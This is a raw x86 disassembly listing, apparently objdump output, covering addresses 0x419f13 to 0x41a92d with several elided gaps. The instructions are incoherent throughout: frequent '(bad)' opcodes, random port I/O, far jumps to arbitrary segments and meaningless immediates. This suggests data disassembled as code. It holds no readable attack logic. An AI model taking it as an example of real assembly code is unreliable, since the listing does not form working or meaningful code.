  419f13:	fidivr DWORD PTR [ecx+0x3a3abbb0]
  419f19:	push   ecx
  419f1a:	sar    BYTE PTR [ebx+0x9],cl
  419f1d:	xor    al,0xc8
  419f1f:	mov    ecx,DWORD PTR [edx]
  419f21:	cmp    al,0x59
  419f23:	popf   
  419f24:	push   esi
  419f25:	add    BYTE PTR [esi+0x3a],ah
  419f28:	inc    esp
  419f29:	xlat   BYTE PTR ds:[ebx]
  419f2a:	outs   dx,DWORD PTR ds:[esi]
  419f2b:	dec    edi
  419f2c:	and    DWORD PTR [eax],ebx
  419f2e:	and    BYTE PTR [edi+0x14798dcc],al
  419f34:	jbe    0x419ef3
  419f36:	(bad)  
  419f37:	lock mov eax,ds:0x5672a480
  419f3d:	xchg   DWORD PTR [esp+ebp*8],edi
  419f40:	and    al,0x8b
  419f42:	jg     0x419f7f
  419f44:	pop    ds
  419f45:	stos   DWORD PTR es:[edi],eax
  419f46:	xor    eax,0xabf45f98
  419f4b:	(bad)  
  419f4c:	pop    edx
  419f4d:	in     eax,0xb8
  419f4f:	push   cs
  419f50:	cmp    dh,BYTE PTR fs:[ecx]
  419f53:	cmp    ch,dh
  419f55:	les    ebp,FWORD PTR [edi-0x6c]
  419f58:	jmp    0x419f16
  419f5a:	sbb    eax,0x1542d5f0
  419f5f:	int    0xa4
  419f61:	ret    
  419f62:	sub    BYTE PTR [ebx-0x2f],dh
  419f65:	mov    ecx,0xb8237566
  419f6a:	sar    DWORD PTR [bp+di-0x64ae],1
  419f6f:	out    0xd5,al
  419f71:	inc    esi
  419f72:	and    DWORD PTR [ecx+0x53443367],0x34e8b429
  419f7c:	jecxz  0x419ffa
  419f7e:	jmp    0xdab9de89
  419f83:	outs   dx,BYTE PTR ds:[esi]
  419f84:	cli    
  419f85:	shr    bh,0x42
  419f88:	jns    0x419f31
  419f8a:	lock in eax,0xff
  419f8d:	pop    ecx
  419f8e:	in     eax,0x55
  419f90:	loop   0x419fed
  419f92:	mov    al,0xab
  419f94:	and    BYTE PTR [esi+ebp*8],bl
  419f97:	int3   
  419f98:	mov    WORD PTR [edi+0x7bbf0d29],?
  419f9e:	push   ecx
  419f9f:	jmp    0x419f96
  419fa1:	popf   
  419fa2:	rol    DWORD PTR [esp+ebx*4+0x55ae215b],cl
  419fa9:	sbb    al,0x5c
  419fab:	mov    ebx,0xdfafc7cb
  419fb0:	repnz inc edx
  419fb2:	add    edi,DWORD PTR [esi]
  419fb4:	push   esi
	...
  41a015:	add    BYTE PTR [esi-0x15],cl
  41a018:	sub    cl,BYTE PTR [esi-0x51]
  41a01b:	iret   
  41a01c:	outs   dx,BYTE PTR ds:[esi]
  41a01d:	jmp    0x41a015
  41a01f:	in     al,dx
  41a020:	pop    ds
  41a021:	outs   dx,DWORD PTR ds:[esi]
  41a022:	sub    DWORD PTR [ebx],ebx
  41a024:	inc    edi
  41a025:	mov    edi,0x111b4
  41a02a:	pop    es
  41a02b:	add    DWORD PTR [eax],eax
  41a02d:	add    BYTE PTR [esi-0x34],ch
  41a030:	pop    ecx
  41a031:	bound  edx,QWORD PTR [ebx+0x5b8c1cac]
  41a037:	imul   ebx,edx,0x60
  41a03a:	sbb    al,0x3b
  41a03c:	fst    DWORD PTR ds:0xfefb47af
  41a042:	add    eax,0xd7d3e4a7
  41a047:	push   ss
  41a048:	add    al,0xfa
  41a04a:	cmp    eax,0x37854518
  41a04f:	arpl   dx,bx
  41a051:	repnz les esp,FWORD PTR [edi]
  41a054:	(bad)
  41a058:	jbe    0x41a06a
  41a05a:	sub    al,0x11
  41a05c:	ficomp WORD PTR [edi-0xe]
  41a05f:	inc    esp
  41a060:	sbb    BYTE PTR [edx+0x64],bl
  41a063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a064:	or     eax,0x65708c30
  41a069:	mov    ebp,0x7471f17d
  41a06e:	jle    0x41a010
  41a070:	test   BYTE PTR [edi+0x662a71c2],cl
  41a076:	pop    ss
  41a077:	pop    eax
  41a078:	popa   
  41a079:	or     esi,ebx
  41a07b:	inc    edi
  41a07c:	mov    cl,0x8d
  41a07e:	inc    BYTE PTR ds:0xe066278f
  41a084:	jns    0x41a092
  41a086:	and    eax,0x39cc8dd5
  41a08b:	cmp    esi,DWORD PTR [eax+0x6b]
  41a08e:	(bad)  
  41a08f:	aam    0x39
  41a091:	(bad)  
  41a092:	jne    0x41a0c2
  41a094:	mov    dl,0xd4
  41a096:	push   ss
  41a097:	adc    edi,edx
  41a099:	in     eax,0x55
  41a09b:	push   ecx
  41a09c:	lds    esi,FWORD PTR [esi+ecx*8+0x40]
  41a0a0:	pop    edi
  41a0a1:	inc    esp
  41a0a2:	aad    0xbb
  41a0a4:	jmp    0x890:0x7ec95e3
  41a0ab:	mov    edx,0xb0d26ec8
  41a0b0:	popa   
  41a0b1:	stos   BYTE PTR es:[edi],al
  41a0b2:	sub    eax,0x40577a71
  41a0b7:	sub    eax,0x2708576a
  41a0bc:	push   ebp
  41a0bd:	cmp    BYTE PTR [ebp+edx*2+0x27],dh
  41a0c1:	and    al,0xee
  41a0c3:	cmp    al,0xd0
  41a0c5:	sbb    BYTE PTR [esp+edx*4],bh
  41a0c8:	inc    ecx
  41a0c9:	in     al,0xfd
  41a0cb:	dec    ecx
  41a0cc:	jo     0x41a0ea
  41a0ce:	jmp    0xc4fd:0xb8f007b4
  41a0d5:	mov    eax,ds:0xa5d1f7a6
  41a0da:	fnsave [edi+0x35]
  41a0dd:	sub    esp,DWORD PTR [esi+0x27]
  41a0e0:	xlat   BYTE PTR ds:[ebx]
  41a0e1:	rcl    DWORD PTR [edi-0x37ef9722],0x3a
  41a0e8:	adc    ecx,DWORD PTR [esi]
  41a0ea:	icebp  
  41a0eb:	mov    eax,0x847b61b5
  41a0f0:	mov    al,0x62
  41a0f2:	mov    dh,0x11
  41a0f4:	jge    0x41a144
  41a0f6:	and    al,0x31
  41a0f8:	cdq    
  41a0f9:	stos   DWORD PTR es:[edi],eax
  41a0fa:	sub    eax,0x9e6e8995
  41a0ff:	jb     0x41a0cc
  41a101:	dec    edi
  41a102:	retf   0xfbf8
  41a105:	sbb    DWORD PTR [ecx-0x444a0357],esi
  41a10b:	xor    DWORD PTR [eax+0x36],edx
  41a10e:	(bad)  
  41a10f:	jge    0x41a0e4
  41a111:	hlt    
  41a112:	(bad)  
  41a113:	fucomp st(3)
  41a115:	mov    ah,ch
  41a117:	cwde   
  41a118:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41a11a:	aam    0xaf
  41a11c:	mov    esi,0x9304b18f
  41a121:	das    
  41a122:	mov    esp,0x76b6172e
  41a127:	cmp    ah,al
  41a129:	push   edi
  41a12a:	and    bl,cl
  41a12c:	cwde   
  41a12d:	imul   eax,edi,0x31
  41a130:	mov    esp,0x46b0792b
	...
  41a195:	add    BYTE PTR [esp+ecx*1],bl
  41a198:	std    
  41a199:	sbb    ebp,edi
  41a19b:	stc    
  41a19c:	cld    
  41a19d:	or     eax,0xe0cd0383
  41a1a2:	or     eax,0xbb43c3cb
  41a1a7:	adc    al,BYTE PTR [ecx]
  41a1a9:	add    BYTE PTR [edi],al
  41a1ab:	add    DWORD PTR [eax],eax
  41a1ad:	add    bh,dh
  41a1af:	inc    edx
  41a1b0:	dec    ebp
  41a1b1:	mov    dh,0xf9
  41a1b3:	xchg   esi,eax
  41a1b4:	mov    dl,0x84
  41a1b6:	outs   dx,DWORD PTR ds:[esi]
  41a1b7:	(bad)
  41a1ba:	cld    
  41a1bb:	add    esp,ecx
  41a1bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1be:	mov    edi,0xade42dc0
  41a1c3:	adc    eax,0xfbeb5446
  41a1c8:	outs   dx,BYTE PTR ds:[esi]
  41a1c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1ca:	pop    eax
  41a1cb:	ror    DWORD PTR [ecx+eax*2-0x30602e8c],cl
  41a1d2:	add    edi,DWORD PTR [edx-0x25]
  41a1d5:	jno    0x41a15f
  41a1d7:	lods   al,BYTE PTR ds:[esi]
  41a1d8:	xor    al,al
  41a1da:	mov    edx,0xf4d45229
  41a1df:	jmp    0x41a193
  41a1e1:	retf   
  41a1e2:	int    0x1c
  41a1e4:	ds jne 0x41a1b6
  41a1e7:	sbb    al,0xcd
  41a1e9:	inc    edi
  41a1ea:	imul   ecx,DWORD PTR [esi],0xc358a3b2
  41a1f0:	xor    esp,edi
  41a1f2:	arpl   bp,sp
  41a1f4:	xchg   esp,eax
  41a1f5:	in     eax,0xd2
  41a1f7:	cli    
  41a1f8:	pusha  
  41a1f9:	je     0x41a21e
  41a1fb:	scas   al,BYTE PTR es:[edi]
  41a1fc:	retf   
  41a1fd:	push   es
  41a1fe:	stos   BYTE PTR es:[edi],al
  41a1ff:	xor    ecx,DWORD PTR [edi+0xb]
  41a202:	xchg   esp,eax
  41a203:	fs je  0x41a1b6
  41a206:	push   esi
  41a207:	inc    BYTE PTR [ecx]
  41a209:	xor    esi,esp
  41a20b:	popf   
  41a20c:	push   0x5fb52dc8
  41a211:	out    dx,al
  41a212:	fdivr  QWORD PTR [ecx]
  41a214:	mov    ds:0xc2e96be1,eax
  41a219:	mov    ?,WORD PTR [ebx+0x26]
  41a21c:	inc    esi
  41a21d:	shl    eax,0xc0
  41a220:	test   al,0xae
  41a222:	pop    DWORD PTR [ebx]
  41a224:	arpl   WORD PTR [ebx-0x60],dx
  41a227:	mov    ebp,0x8525724f
  41a22c:	or     edx,DWORD PTR [ebx+0x13]
  41a22f:	icebp  
  41a230:	sbb    al,0x2
  41a232:	imul   edi,DWORD PTR [edi],0xffffffe6
  41a235:	cmp    cl,BYTE PTR [esi+0x607b97f2]
  41a23b:	adc    al,0x23
  41a23d:	mov    fs,WORD PTR [ebp+0xb56c73e]
  41a243:	jbe    0x41a237
  41a245:	fwait
  41a246:	in     eax,dx
  41a247:	jge    0x41a295
  41a249:	push   esp
  41a24a:	mov    edi,0x1d64e475
  41a24f:	in     eax,dx
  41a250:	inc    esp
  41a251:	into   
  41a252:	nop
  41a253:	clc    
  41a254:	aad    0xa
  41a256:	jnp    0x41a2c4
  41a258:	xchg   edi,eax
  41a259:	dec    edi
  41a25a:	mov    esi,DWORD PTR [eax]
  41a25c:	push   edx
  41a25d:	and    eax,0xc761e789
  41a262:	push   esi
  41a263:	mov    ch,0xf2
  41a265:	mov    ebx,DWORD PTR [ecx+0xe]
  41a268:	or     BYTE PTR [ebx],bl
  41a26a:	mov    ebp,ds
  41a26c:	(bad)
  41a26f:	imul   ebp,DWORD PTR [edi],0x8d923054
  41a275:	cmp    eax,0x4c9ddf73
  41a27a:	(bad)  
  41a27b:	fistp  QWORD PTR [ebp-0x4b]
  41a27e:	jno    0x41a221
  41a280:	sbb    BYTE PTR [edx],dl
  41a282:	fisubr DWORD PTR [ebp*1+0x2a1e82f3]
  41a289:	mov    eax,0xdcfe47bb
  41a28e:	(bad)  
  41a28f:	jne    0x41a257
  41a291:	jl     0x41a22d
  41a293:	jmp    0xae06e8a9
  41a298:	xlat   BYTE PTR ds:[ebx]
  41a299:	mov    edi,DWORD PTR [ebp+0x69]
  41a29c:	or     edi,DWORD PTR [ebp-0x22]
  41a29f:	je     0x41a22e
  41a2a1:	inc    ecx
  41a2a2:	pop    ebx
  41a2a3:	outs   dx,BYTE PTR ds:[esi]
  41a2a4:	cmp    BYTE PTR [ebx-0x50],0x0
  41a2a8:	retf   0xa5d4
  41a2ab:	jb     0x41a284
  41a2ad:	lock or eax,0x983b719b
  41a2b3:	daa    
  41a2b4:	add    BYTE PTR ss:[eax],al
	...
  41a313:	add    BYTE PTR [eax],al
  41a315:	add    bh,dh
  41a317:	pop    eax
  41a318:	test   al,0x13
  41a31a:	scas   eax,DWORD PTR es:[edi]
  41a31b:	repz (bad) 
  41a31d:	cld    
  41a31e:	arpl   ax,bx
  41a320:	shl    DWORD PTR [eax-0x6121882e],0xc2
  41a327:	adc    eax,DWORD PTR [ecx]
  41a329:	add    BYTE PTR [edi],al
  41a32b:	add    DWORD PTR [eax],eax
  41a32d:	add    ah,bl
  41a32f:	fisttp QWORD PTR [edx]
  41a331:	test   eax,0x96007436
  41a336:	adc    DWORD PTR [edx-0x3],edx
  41a339:	xchg   esp,eax
  41a33a:	push   cs
  41a33b:	in     eax,dx
  41a33c:	cwde   
  41a33d:	in     al,dx
  41a33e:	add    ebp,DWORD PTR [edi-0xc]
  41a341:	jo     0x41a2ce
  41a343:	mov    al,ds:0xe2d73196
  41a348:	mov    al,ds:0x2908e217
  41a34d:	cs popf 
  41a34f:	push   es
  41a350:	in     eax,0xc4
  41a352:	sub    al,BYTE PTR [ebx-0x125f8c02]
  41a358:	test   BYTE PTR [eax],cl
  41a35a:	jae    0x41a2f5
  41a35c:	inc    esp
  41a35d:	getsec 
  41a35f:	add    al,0x82
  41a361:	daa    
  41a362:	enter  0xc74d,0xdd
  41a366:	sar    DWORD PTR [esi+ebp*1+0x50],0xaa
  41a36b:	in     al,0xf
  41a36d:	outs   dx,DWORD PTR ds:[esi]
  41a36e:	sub    al,BYTE PTR [ebp-0xb]
  41a371:	push   0xa43a85bb
  41a376:	mov    ch,0xad
  41a378:	jns    0x41a3a9
  41a37a:	cwde   
  41a37b:	arpl   WORD PTR [ebp*4-0x2b364180],si
  41a382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a383:	cmc    
  41a384:	and    al,0x4
  41a386:	fldenv [ebx-0x65]
  41a389:	jg     0x41a3c3
  41a38b:	scas   al,BYTE PTR es:[edi]
  41a38c:	iret   
  41a38d:	add    al,0xce
  41a38f:	mov    ecx,0x76da5a56
  41a394:	js     0x41a3b6
  41a396:	inc    esp
  41a397:	inc    esp
  41a398:	pop    esp
  41a399:	pop    esi
  41a39a:	dec    esi
  41a39b:	test   DWORD PTR [ecx],edx
  41a39d:	sbb    edx,edi
  41a39f:	jne    0x41a352
  41a3a1:	mov    edx,esp
  41a3a3:	int3   
  41a3a4:	cmp    al,0x54
  41a3a6:	aas    
  41a3a7:	mov    eax,ds:0xa77542df
  41a3ac:	push   edi
  41a3ad:	das    
  41a3ae:	pop    ecx
  41a3af:	imul   eax,DWORD PTR [eax+0x149203e9],0x6a
  41a3b6:	cvtps2pd xmm2,QWORD PTR [ebx-0x76]
  41a3ba:	mov    DWORD PTR [eax+ecx*1-0x6f03629c],edi
  41a3c1:	push   cs
  41a3c2:	sti    
  41a3c3:	pop    ebp
  41a3c4:	sub    eax,0x7751a4e9
  41a3c9:	mov    ebp,0x2256ff38
  41a3ce:	cmp    cl,0x9
  41a3d1:	mov    al,ds:0x556955db
  41a3d6:	adc    ah,BYTE PTR [ebx]
  41a3d8:	(bad)  
  41a3d9:	(bad)  
  41a3da:	pop    esi
  41a3db:	cdq    
  41a3dc:	das    
  41a3dd:	loop   0x41a399
  41a3df:	cwde   
  41a3e0:	push   ecx
  41a3e1:	mov    cl,0xc2
  41a3e3:	scas   eax,DWORD PTR es:[edi]
  41a3e4:	inc    ecx
  41a3e5:	mov    ds:0x883b683e,al
  41a3ea:	and    bh,bh
  41a3ec:	mov    BYTE PTR [eax+ebx*1],bh
  41a3ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3f0:	mov    ah,BYTE PTR [eax]
  41a3f2:	test   al,0x62
  41a3f4:	stos   DWORD PTR es:[edi],eax
  41a3f5:	gs pop esi
  41a3f7:	mov    DWORD PTR [edi+0x693757bd],eax
  41a3fd:	xchg   edx,eax
  41a3fe:	fisub  WORD PTR [edi+0xf7c2e1]
  41a404:	in     eax,0x6c
  41a406:	sbb    ah,al
  41a408:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a409:	jge    0x41a484
  41a40b:	aad    0x33
  41a40d:	jo     0x41a46a
  41a40f:	(bad)  
  41a410:	mov    ds:0x18636a22,eax
  41a415:	lock sub bh,BYTE PTR [ecx+0x45]
  41a419:	and    dl,BYTE PTR [eax]
  41a41b:	xchg   esp,eax
  41a41c:	push   ds
  41a41d:	test   eax,0xc59fec10
  41a422:	mov    bh,0xb0
  41a424:	and    esp,edx
  41a426:	jnp    0x41a421
  41a428:	xchg   DWORD PTR [eax+0x4bec79a9],eax
  41a42e:	jle    0x41a469
  41a430:	pop    ebp
  41a431:	mov    ds:0x842a68,al
	...
  41a496:	mov    edi,0xff0fcf82
  41a49b:	dec    edi
  41a49c:	push   DWORD PTR [edx+0x6df04d13]
  41a4a2:	jnp    0x41a4ca
  41a4a4:	outs   dx,BYTE PTR ds:[esi]
  41a4a5:	js     0x41a470
  41a4a7:	adc    al,0x1
  41a4a9:	add    BYTE PTR [edi],al
  41a4ab:	add    DWORD PTR [eax],eax
  41a4ad:	add    BYTE PTR [edx+0x45],al
  41a4b0:	sti    
  41a4b1:	sahf   
  41a4b2:	enter  0xcd59,0xed
  41a4b6:	ror    dl,cl
  41a4b8:	rcr    al,0xfa
  41a4bb:	pop    esp
  41a4bc:	mov    eax,ds:0xc4f8aad
  41a4c1:	rcl    DWORD PTR [eax+0x384d31df],1
  41a4c7:	in     al,0x15
  41a4c9:	mov    cl,0x62
  41a4cb:	push   ss
  41a4cc:	pop    eax
  41a4cd:	sub    cl,dl
  41a4cf:	in     al,0x7d
  41a4d1:	(bad)  
  41a4d3:	pop    edi
  41a4d4:	cmp    esp,DWORD PTR [eax-0xc]
  41a4d7:	and    al,0x31
  41a4d9:	dec    edx
  41a4da:	test   BYTE PTR [ebp-0x72],0x7d
  41a4de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4df:	mov    ebp,0x36c04e05
  41a4e4:	adc    ebx,0x27fd9a95
  41a4ea:	mov    ds:0xf5036b1f,eax
  41a4ef:	xchg   edx,eax
  41a4f0:	xchg   DWORD PTR [edx+0x4b],esp
  41a4f3:	adc    BYTE PTR [edi],dh
  41a4f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f6:	ins    DWORD PTR es:[edi],dx
  41a4f7:	into   
  41a4f8:	mov    eax,ds:0xcc4e31d1
  41a4fd:	xor    al,ch
  41a4ff:	adc    bl,BYTE PTR [edx+ebx*2+0x2ae08399]
  41a506:	inc    esp
  41a507:	xor    eax,esi
  41a509:	xchg   ebx,eax
  41a50a:	push   esp
  41a50b:	hlt    
  41a50c:	outs   dx,DWORD PTR ds:[esi]
  41a50d:	loope  0x41a4ee
  41a50f:	sbb    al,0x59
  41a511:	push   0x1bf21573
  41a516:	pop    esp
  41a517:	inc    ecx
  41a518:	das    
  41a519:	mov    dh,0x32
  41a51b:	stos   DWORD PTR es:[edi],eax
  41a51c:	and    eax,0xeb0102f5
  41a521:	add    ebx,DWORD PTR [eax+0x50903172]
  41a527:	scas   al,BYTE PTR es:[edi]
  41a528:	or     ebx,esp
  41a52a:	dec    ecx
  41a52b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a52c:	mov    al,ds:0x20d235a
  41a531:	sbb    edx,eax
  41a533:	ror    BYTE PTR [edi+0x2d],cl
  41a536:	cwde   
  41a537:	pusha  
  41a538:	fistp  QWORD PTR [eax+0x4f]
  41a53b:	add    eax,0x6c469ceb
  41a540:	adc    ch,bh
  41a542:	shl    BYTE PTR ds:0xffafe6b9,0xcc
  41a549:	pushf  
  41a54a:	jb     0x41a4e2
  41a54c:	and    ebp,DWORD PTR [ebx+ebp*1+0x113acf2c]
  41a553:	ins    DWORD PTR es:[edi],dx
  41a554:	xor    BYTE PTR [ebx],bh
  41a556:	in     al,dx
  41a557:	cdq    
  41a558:	shl    esp,cl
  41a55a:	imul   DWORD PTR [edi+esi*8]
  41a55d:	mov    al,ds:0x35cca232
  41a562:	sbb    al,0xf0
  41a564:	or     eax,0x329329a7
  41a569:	adc    DWORD PTR [esi-0x8f142a],0xffffffc6
  41a570:	sbb    eax,0x9e4adffa
  41a575:	push   ds
  41a576:	aam    0xba
  41a578:	or     eax,0x5d9ee6c6
  41a57d:	cld    
  41a57e:	push   0x5
  41a580:	rcr    BYTE PTR [ebx-0x12502c9b],1
  41a586:	pop    ebp
  41a587:	pop    ecx
  41a588:	dec    ebx
  41a589:	and    eax,0x5e7944fb
  41a58e:	cmp    cl,cl
  41a590:	mov    ds:0xb63f1562,eax
  41a595:	ds gs mov dh,0xfc
  41a599:	xor    dh,BYTE PTR [edi+0x1c]
  41a59c:	iret   
  41a59d:	push   0x928708b7
  41a5a2:	lea    ecx,[ebx+edx*8]
  41a5a5:	mov    edi,0x6c180e2f
  41a5aa:	mov    edi,0x20bfd301
  41a5af:	jne    0x41a5a6
  41a5b1:	jecxz  0x41a630
  41a5b3:	fst    st(5)
	...
  41a615:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a619:	inc    ecx
  41a61a:	ja     0x41a687
  41a61c:	pop    esp
  41a61d:	aas    
  41a61e:	pop    ecx
  41a61f:	jmp    0x41a5e9
  41a621:	mov    edx,0x35acb305
  41a626:	rcl    BYTE PTR ds:0x1070001,1
  41a62c:	add    BYTE PTR [eax],al
  41a62e:	cwde   
  41a62f:	xor    al,0x72
  41a631:	jae    0x41a67f
  41a633:	inc    edx
  41a634:	mov    al,bh
  41a636:	in     eax,0xc1
  41a638:	call   0x93a3c57f
  41a63d:	or     al,0x34
  41a63f:	int3   
  41a640:	in     eax,0xbf
  41a642:	xor    eax,0x2502666b
  41a647:	sub    eax,0xf0b792ec
  41a64c:	adc    eax,0xb237ae0f
  41a651:	jb     0x41a68f
  41a653:	mov    WORD PTR [eax],ds
  41a655:	cmp    al,0xe1
  41a657:	inc    edi
  41a658:	(bad)
  41a65b:	jb     0x41a5de
  41a65d:	aaa    
  41a65e:	js     0x41a5e3
  41a660:	mov    esi,0x33ef4145
  41a665:	jae    0x41a6b3
  41a667:	dec    eax
  41a668:	cmp    DWORD PTR [ecx+esi*1-0x37f27bed],ebx
  41a66f:	test   BYTE PTR [ebx+ebx*2],bh
  41a672:	rcr    BYTE PTR [esi+0x1c],cl
  41a675:	fisub  DWORD PTR [ecx+0x3498876f]
  41a67b:	out    dx,eax
  41a67c:	lods   al,BYTE PTR ds:[esi]
  41a67d:	outs   dx,DWORD PTR ds:[esi]
  41a67e:	or     eax,0x7de9b794
  41a683:	std    
  41a684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a685:	mov    ds:0x975e8a0d,eax
  41a68a:	xor    esp,DWORD PTR [ebp-0x17b52915]
  41a690:	enterw 0xe1cb,0x89
  41a695:	arpl   WORD PTR [edi],dx
  41a697:	loop   0x41a66a
  41a699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a69a:	call   0x95c3:0x45d7863d
  41a6a1:	int    0x74
  41a6a3:	(bad)  [esi-0x60b98ade]
  41a6a9:	lods   al,BYTE PTR ds:[esi]
  41a6ab:	jnp    0x41a693
  41a6ad:	adc    edi,DWORD PTR [ecx-0x431e99e2]
  41a6b3:	mov    eax,ds:0x96cc15f3
  41a6b8:	jmp    0x3186:0x71b8433d
  41a6bf:	test   eax,0x7d27a315
  41a6c4:	hlt    
  41a6c5:	retf   
  41a6c6:	je     0x41a671
  41a6c8:	jbe    0x41a746
  41a6ca:	popa   
  41a6cb:	mov    ebx,0x62591e3
  41a6d0:	push   ebp
  41a6d1:	sar    ebx,1
  41a6d3:	jl     0x41a68d
  41a6d5:	in     al,dx
  41a6d6:	out    dx,al
  41a6d7:	imul   esi,DWORD PTR [edi+0x18],0x5871bead
  41a6de:	(bad)  
  41a6df:	jno    0x41a673
  41a6e1:	daa    
  41a6e2:	push   edi
  41a6e3:	in     eax,dx
  41a6e4:	mov    ebp,esp
  41a6e6:	aad    0x90
  41a6e8:	in     al,0x63
  41a6ea:	lods   eax,DWORD PTR ds:[esi]
  41a6eb:	fisttp QWORD PTR [edi+0x74]
  41a6ee:	repz jns 0x41a672
  41a6f1:	div    DWORD PTR [edx]
  41a6f3:	daa    
  41a6f4:	inc    esp
  41a6f5:	add    cl,al
  41a6f7:	lods   eax,DWORD PTR ds:[esi]
  41a6f8:	in     eax,0x20
  41a6fa:	fiadd  DWORD PTR [ebx+0x32]
  41a6fd:	dec    esi
  41a6fe:	popa   
  41a6ff:	inc    edx
  41a700:	xchg   edx,eax
  41a701:	into   
  41a702:	aad    0x8d
  41a704:	pop    eax
  41a705:	mov    al,0xc2
  41a707:	imul   esp,DWORD PTR ds:0x4ea4cffb,0xffffffd3
  41a70e:	fcmovnbe st,st(1)
  41a710:	jmp    0x8346:0x125bad6e
  41a717:	rcl    ch,0xa2
  41a71a:	cmp    esi,edx
  41a71c:	cmp    eax,0x9f2ad5c
  41a721:	fnstcw WORD PTR [esp+esi*8+0x657365fc]
  41a728:	mov    ecx,0x7dc46e2b
  41a72d:	adc    DWORD PTR [esp+ecx*4-0x4e],ebp
  41a731:	add    BYTE PTR [esi+0x5a01],0x0
	...
  41a794:	add    BYTE PTR [eax],al
  41a796:	repz xchg edi,eax
  41a798:	jae    0x41a721
  41a79a:	ja     0x41a783
  41a79c:	div    edi
  41a79e:	fisttp QWORD PTR [ebx-0x4d18af58]
  41a7a4:	xchg   ebx,eax
  41a7a5:	inc    esi
  41a7a6:	xlat   BYTE PTR ds:[ebx]
  41a7a7:	push   ss
  41a7a8:	add    DWORD PTR [eax],eax
  41a7aa:	pop    es
  41a7ab:	add    DWORD PTR [eax],eax
  41a7ad:	add    bl,cl
  41a7af:	in     al,dx
  41a7b0:	mov    esp,0x57a9349a
  41a7b5:	cmp    eax,0x55249a69
  41a7ba:	loope  0x41a7b4
  41a7bc:	sti    
  41a7bd:	inc    eax
  41a7be:	jecxz  0x41a79d
  41a7c0:	cmp    al,0xac
  41a7c2:	mov    WORD PTR [ebp-0x2f],ss
  41a7c5:	loope  0x41a824
  41a7c7:	push   cs
  41a7c8:	xchg   ebx,eax
  41a7c9:	jl     0x41a7ea
  41a7cb:	mov    cl,0xfa
  41a7cd:	cli    
  41a7ce:	test   BYTE PTR [edi-0x3a],dh
  41a7d1:	in     eax,dx
  41a7d2:	jl     0x41a791
  41a7d4:	push   edx
  41a7d5:	repz ss in eax,0xb1
  41a7d9:	pusha  
  41a7da:	sub    dl,BYTE PTR [ebx-0x5a92d01b]
  41a7e0:	mov    dh,0x7c
  41a7e2:	jno    0x41a7fb
  41a7e4:	dec    eax
  41a7e5:	cmp    eax,0x75a511a8
  41a7ea:	das    
  41a7eb:	mov    bh,0xf7
  41a7ed:	dec    edx
  41a7ee:	xor    DWORD PTR [ebx-0x2f],ebp
  41a7f1:	sbb    al,0x51
  41a7f3:	sbb    ch,bl
  41a7f5:	dec    eax
  41a7f6:	mov    ah,0x2e
  41a7f8:	jecxz  0x41a81a
  41a7fa:	sbb    esp,ebp
  41a7fc:	faddp  st(1),st
  41a7fe:	in     eax,dx
  41a7ff:	mov    eax,ds:0xa1a2af3e
  41a804:	jge    0x41a7b7
  41a806:	push   edi
  41a807:	sub    ch,BYTE PTR [ecx]
  41a809:	ret    0xb23f
  41a80c:	pushf  
  41a80d:	mov    esp,0x82e38570
  41a812:	mov    edx,0xdedbd7ac
  41a817:	sbb    BYTE PTR [edi+0x2b9b7a5],cl
  41a81d:	pop    edi
  41a81e:	icebp  
  41a81f:	cdq    
  41a820:	cwde   
  41a821:	mov    ecx,0xebcf096c
  41a826:	inc    esp
  41a827:	pop    edx
  41a828:	enter  0xb892,0xd6
  41a82c:	pop    edx
  41a82d:	or     DWORD PTR [edi+0x15],ecx
  41a830:	jo     0x41a7bb
  41a832:	sub    bh,BYTE PTR [ebp+0x52]
  41a835:	adc    BYTE PTR [esi-0x4287990d],0x98
  41a83c:	fstp   QWORD PTR [esi]
  41a83e:	das    
  41a83f:	out    dx,al
  41a840:	mov    WORD PTR [edx],ds
  41a842:	out    0x61,al
  41a844:	mov    dh,0x5d
  41a846:	inc    ecx
  41a847:	inc    edx
  41a848:	pop    ds
  41a849:	dec    esp
  41a84a:	push   edi
  41a84b:	xchg   ebx,eax
  41a84c:	hlt    
  41a84d:	ret    
  41a84e:	clc    
  41a84f:	fcom   DWORD PTR ds:0xd0785742
  41a855:	mov    WORD PTR [edi-0x2f3da419],?
  41a85b:	shl    DWORD PTR [ebp-0x4c],0x33
  41a85f:	stos   BYTE PTR es:[edi],al
  41a860:	addr16 or ebx,eax
  41a863:	test   bl,cl
  41a865:	jo     0x41a86c
  41a867:	xor    ch,dh
  41a869:	mov    ds:0x95bfdf7c,al
  41a86e:	pop    ebp
  41a86f:	mov    eax,0xa214ce98
  41a874:	push   0x56
  41a876:	or     DWORD PTR [ebx+eax*2+0x1848b1d1],ebx
  41a87d:	jmp    0xb777:0x325e9beb
  41a884:	popa   
  41a885:	mov    DWORD PTR [esi],ebp
  41a887:	lahf   
  41a888:	aam    0xb3
  41a88a:	test   BYTE PTR [eax-0x74],0x36
  41a88e:	mov    WORD PTR [ebx+0x7ab4b5b9],?
  41a894:	xor    BYTE PTR ds:0xb5a1f8e1,bh
  41a89a:	bswap  esi
  41a89c:	fwait
  41a89d:	bound  edi,QWORD PTR ds:0xee9cae4
  41a8a3:	fnsave [ecx+0x73]
  41a8a6:	clc    
  41a8a7:	dec    ecx
  41a8a8:	cld    
  41a8a9:	mov    al,ds:0x377fbcec
  41a8ae:	call   0xebdc524
  41a8b3:	inc    ebp
  41a8b4:	pushf  
	...
  41a915:	add    BYTE PTR ds:0xcf4a867e,dh
  41a91b:	cli    
  41a91c:	std    
  41a91d:	jg     0x41a90a
  41a91f:	mov    ds:0xec8a323e,al
  41a924:	or     eax,0x117de08
  41a929:	add    BYTE PTR [edi],al
  41a92b:	add    DWORD PTR [eax],eax
  41a92d:	add    BYTE PTR [ecx],bh
